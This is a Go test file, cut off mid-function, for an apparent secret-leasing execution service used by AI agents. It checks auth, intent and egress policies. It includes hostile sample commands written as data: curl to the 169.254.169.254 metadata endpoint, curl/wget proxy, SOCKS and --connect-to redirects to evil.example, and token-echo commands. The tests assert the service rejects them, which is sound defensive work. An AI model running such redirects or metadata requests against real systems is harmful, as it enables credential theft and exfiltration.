package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"testing"
	"time"

	"github.com/lunemec/promptlock/internal/adapters/memory"
	"github.com/lunemec/promptlock/internal/app"
	"github.com/lunemec/promptlock/internal/auth"
	"github.com/lunemec/promptlock/internal/config"
	"github.com/lunemec/promptlock/internal/core/domain"
	"github.com/lunemec/promptlock/internal/core/ports"
)

type testAudit struct{}

func (testAudit) Write(_ ports.AuditEvent) error { return nil }

func TestExecuteWithSecrets(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc:         app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy:  config.ExecutionPolicy{ExactMatchExecutables: []string{"bash"}, DenylistSubstrings: []string{"printenv"}, MaxOutputBytes: 65536, DefaultTimeoutSec: 30, MaxTimeoutSec: 60},
		authStore:   aStore,
		now:         func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","command":["bash","-lc","echo -n $GITHUB_TOKEN"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}
	var out map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if _, ok := out["stdout_stderr"]; !ok {
		t.Fatalf("expected stdout_stderr in response")
	}
}

func TestExecuteHardenedRejectsMissingIntent(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc:             app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled:     true,
		authCfg:         config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy:      config.ExecutionPolicy{ExactMatchExecutables: []string{"bash", "go"}, DenylistSubstrings: []string{"printenv"}, MaxOutputBytes: 65536, DefaultTimeoutSec: 30, MaxTimeoutSec: 60},
		securityProfile: "hardened",
		authStore:       aStore,
		now:             func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","command":["go","version"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for missing intent in hardened profile, got %d body=%s", w.Code, w.Body.String())
	}
}

func TestExecuteHardenedRejectsShellWrapper(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc:             app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled:     true,
		authCfg:         config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy:      config.ExecutionPolicy{ExactMatchExecutables: []string{"bash", "go"}, DenylistSubstrings: []string{"printenv"}, MaxOutputBytes: 65536, DefaultTimeoutSec: 30, MaxTimeoutSec: 60},
		securityProfile: "hardened",
		authStore:       aStore,
		now:             func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","intent":"run_tests","command":["bash","-lc","echo hi"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for shell wrapper in hardened profile, got %d body=%s", w.Code, w.Body.String())
	}
}

func TestExecuteRejectsIntentWideningBeyondApprovedLease(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc: app.Service{
			Policy:       domain.DefaultPolicy(),
			Requests:     store,
			Leases:       store,
			Secrets:      store,
			Audit:        testAudit{},
			Now:          func() time.Time { return now },
			NewRequestID: func() string { return "r1" },
			NewLeaseTok:  func() string { return "l1" },
		},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"curl"},
			CommandSearchPaths:    []string{"/usr/bin", "/bin"},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		networkEgressPolicy: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{
				"run_tests": {"api.github.com"},
				"deploy":    {"deploy.example.com"},
			},
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","intent":"deploy","command":["curl","https://deploy.example.com"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for execute-time intent widening, got %d body=%s", w.Code, w.Body.String())
	}
}

func TestExecuteRejectsBlockedNetworkEgressForApprovedLease(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc: app.Service{
			Policy:       domain.DefaultPolicy(),
			Requests:     store,
			Leases:       store,
			Secrets:      store,
			Audit:        testAudit{},
			Now:          func() time.Time { return now },
			NewRequestID: func() string { return "r1" },
			NewLeaseTok:  func() string { return "l1" },
		},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"curl"},
			CommandSearchPaths:    []string{"/usr/bin", "/bin"},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		networkEgressPolicy: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
			DenySubstrings:     []string{"169.254.169.254"},
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","intent":"run_tests","command":["curl","http://169.254.169.254/latest/meta-data"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for approved-lease egress deny, got %d body=%s", w.Code, w.Body.String())
	}
}

func TestExecuteRejectsDirectNetworkClientWithoutInspectableDestinationForApprovedLease(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc: app.Service{
			Policy:       domain.DefaultPolicy(),
			Requests:     store,
			Leases:       store,
			Secrets:      store,
			Audit:        testAudit{},
			Now:          func() time.Time { return now },
			NewRequestID: func() string { return "r1" },
			NewLeaseTok:  func() string { return "l1" },
		},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"curl"},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		networkEgressPolicy: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","intent":"run_tests","command":["curl","--config","./agent-controlled.cfg"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for approved-lease direct-network no-destination deny, got %d body=%s", w.Code, w.Body.String())
	}
	if !bytes.Contains(w.Body.Bytes(), []byte("inspectable destination")) {
		t.Fatalf("expected inspectable-destination deny detail, got %s", w.Body.String())
	}
}

func TestExecuteRejectsDirectNetworkClientDecoyDestinationFlagsForApprovedLease(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc: app.Service{
			Policy:       domain.DefaultPolicy(),
			Requests:     store,
			Leases:       store,
			Secrets:      store,
			Audit:        testAudit{},
			Now:          func() time.Time { return now },
			NewRequestID: func() string { return "r1" },
			NewLeaseTok:  func() string { return "l1" },
		},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"curl"},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		networkEgressPolicy: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","intent":"run_tests","command":["curl","--config","./agent-controlled.cfg","-u","api.github.com:token"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403 for approved-lease direct-network decoy-destination deny, got %d body=%s", w.Code, w.Body.String())
	}
	if !bytes.Contains(w.Body.Bytes(), []byte("inspectable destination")) {
		t.Fatalf("expected inspectable-destination deny detail, got %s", w.Body.String())
	}
}

func TestExecuteRejectsOpaqueOrDestinationOverrideArgsForApprovedLease(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Intent: "run_tests", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc: app.Service{
			Policy:       domain.DefaultPolicy(),
			Requests:     store,
			Leases:       store,
			Secrets:      store,
			Audit:        testAudit{},
			Now:          func() time.Time { return now },
			NewRequestID: func() string { return "r1" },
			NewLeaseTok:  func() string { return "l1" },
		},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"curl", "wget"},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		networkEgressPolicy: config.NetworkEgressPolicy{
			Enabled:            true,
			RequireIntentMatch: true,
			IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	for _, payload := range []string{
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--config","./agent-controlled.cfg"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--proxy","http://evil.example:8080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--proxy1.0","http://evil.example:8080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--preproxy","http://evil.example:8080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--connect-to","api.github.com:443:evil.example:443"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--resolve","api.github.com:443:10.0.0.1"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--socks4","evil.example:1080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--socks4a","evil.example:1080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--socks5","evil.example:1080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--socks5-hostname","evil.example:1080"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["curl","https://api.github.com/repos","--future-route-override","evil.example"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["wget","https://api.github.com/repos","--config","./agent-controlled.cfg"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["wget","https://api.github.com/repos","--input-file","./urls.txt"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
		`{"lease_token":"l1","intent":"run_tests","command":["wget","https://api.github.com/repos","--execute","use_proxy=on"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`,
	} {
		req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
		req.Header.Set("Authorization", "Bearer s1")
		w := httptest.NewRecorder()
		s.handleExecute(w, req)
		if w.Code != http.StatusForbidden {
			t.Fatalf("expected 403 for approved-lease opaque/destination-override deny, got %d body=%s", w.Code, w.Body.String())
		}
		if !bytes.Contains(w.Body.Bytes(), []byte("opaque or destination-override")) {
			t.Fatalf("expected opaque/destination-override deny detail, got %s", w.Body.String())
		}
	}
}

func TestExecuteWithSecretsOutputModeNone(t *testing.T) {
	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	s := wiredServerForTest(&server{
		svc:         app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy:  config.ExecutionPolicy{ExactMatchExecutables: []string{"bash"}, DenylistSubstrings: []string{"printenv"}, OutputSecurityMode: "none", MaxOutputBytes: 65536, DefaultTimeoutSec: 30, MaxTimeoutSec: 60},
		authStore:   aStore,
		now:         func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","command":["bash","-lc","echo -n $GITHUB_TOKEN"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}
	var out struct {
		StdoutStderr string `json:"stdout_stderr"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if out.StdoutStderr != "" {
		t.Fatalf("expected empty output in none mode, got %q", out.StdoutStderr)
	}
}

func TestExecuteWithSecretsUsesControlledSearchPath(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script executable helper is unix-specific")
	}

	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	shadowDir := t.TempDir()
	trustedDir := t.TempDir()
	writeExecutableScript(t, filepath.Join(shadowDir, "go"), "echo shadowed")
	writeExecutableScript(t, filepath.Join(trustedDir, "go"), "echo trusted")
	t.Setenv("PATH", shadowDir+string(os.PathListSeparator)+trustedDir)

	s := wiredServerForTest(&server{
		svc:         app.Service{Policy: domain.DefaultPolicy(), Requests: store, Leases: store, Secrets: store, Audit: testAudit{}, Now: func() time.Time { return now }, NewRequestID: func() string { return "r1" }, NewLeaseTok: func() string { return "l1" }},
		authEnabled: true,
		authCfg:     config.AuthConfig{EnableAuth: true, OperatorToken: "op", AllowPlaintextSecretReturn: false},
		execPolicy: config.ExecutionPolicy{
			ExactMatchExecutables: []string{"go"},
			CommandSearchPaths:    []string{trustedDir},
			OutputSecurityMode:    "raw",
			MaxOutputBytes:        65536,
			DefaultTimeoutSec:     30,
			MaxTimeoutSec:         60,
		},
		authStore: aStore,
		now:       func() time.Time { return now },
	})

	payload := `{"lease_token":"l1","command":["go","version"],"secrets":["github_token"],"command_fingerprint":"fp","workdir_fingerprint":"wd"}`
	req := httptest.NewRequest(http.MethodPost, "/v1/leases/execute", bytes.NewBufferString(payload))
	req.Header.Set("Authorization", "Bearer s1")
	w := httptest.NewRecorder()
	s.handleExecute(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", w.Code, w.Body.String())
	}

	var out struct {
		StdoutStderr string `json:"stdout_stderr"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if out.StdoutStderr != "trusted\n" {
		t.Fatalf("expected controlled search path to execute trusted binary, got %q", out.StdoutStderr)
	}
}

func TestExecuteWithSecretsPreservesOriginalArgv0ForResolvedSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink/applet argv0 test is unix-specific")
	}

	now := time.Now().UTC()
	store := memory.NewStore()
	store.SetSecret("github_token", "ok123")
	_ = store.SaveRequest(domain.LeaseRequest{ID: "r1", AgentID: "a1", TaskID: "t1", TTLMinutes: 5, Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", Status: domain.RequestApproved, CreatedAt: now})
	_ = store.SaveLease(domain.Lease{Token: "l1", RequestID: "r1", AgentID: "a1", TaskID: "t1", Secrets: []string{"github_token"}, CommandFingerprint: "fp", WorkdirFingerprint: "wd", ExpiresAt: now.Add(5 * time.Minute)})

	aStore := auth.NewStore()
	aStore.SaveGrant(auth.PairingGrant{GrantID: "g1", AgentID: "a1", CreatedAt: now, LastUsedAt: now, IdleExpiresAt: now.Add(10 * time.Minute), AbsoluteExpiresAt: now.Add(1 * time.Hour)})
	aStore.SaveSession(auth.SessionToken{Token: "s1", GrantID: "g1", AgentID: "a1", CreatedAt: now, ExpiresAt: now.Add(10 * time.Minute)})

	trustedDir := t.TempDir()
	targetPath := buildArgvPrinter(t, trustedDir)
	linkPath := filepath.Join(trustedDir, "echo")
	if err := os.Symlink(targetPath, linkPath); err != nil {
		t.Fatalf("symlink argv printer: %v", err)
	}
	t.Setenv("PATH", trustedDir)

	s := wiredServerForTest(&server{
